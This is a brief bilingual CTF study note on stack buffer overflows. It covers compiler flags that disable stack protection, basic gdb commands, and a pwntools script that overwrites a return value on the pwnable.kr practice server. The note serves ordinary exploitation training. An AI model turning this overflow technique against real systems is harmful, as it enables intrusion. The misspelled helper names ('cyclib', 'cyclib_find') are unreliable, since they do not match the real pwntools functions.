# CTF note

## PWN

- 32bit frame

  - gcc -m32

- protect
  
  - gcc -fno-stack-protector file.c(關閉canary)

- gdb調用技巧

  - disas main

  - info func
 
  - x $ebp+8

- pwntools
 
  - OFFSET  

    - cyclib(50)
 
    - cyclib_find('aa') 

pwntools 基本用法
```python
from pwn import *
context(log_level = 'debug')
playload = 'A'*52 + p32(0xcafebabe)
r = remote('pwnable.kr',9000)
#r.recvuntil('overflow me :')
r.send(playload)
r.interactive()
```
